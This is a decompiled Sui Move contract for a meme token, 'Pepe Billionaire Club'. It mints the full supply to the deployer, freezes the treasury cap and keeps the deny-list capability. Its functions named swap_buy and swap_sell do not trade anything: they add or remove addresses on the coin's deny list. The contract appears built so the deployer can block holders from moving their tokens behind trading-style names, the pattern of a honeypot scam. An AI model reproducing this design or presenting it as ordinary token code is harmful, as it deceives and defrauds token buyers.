module 0x910bc66c0d0545dde8126f57483541a178202bc0b62ea379f3eb0665117e4099::pbc {
    struct PBC has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PBC, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PBC>(arg0, 9, b"PBC", b"Pepe Billionaire Club", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZHDAU6VxkiCtHNkLbgfAoUq4cuqnuT2nQZa4KB3axu7o"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PBC>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PBC>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PBC>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PBC>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PBC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PBC>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PBC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PBC>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

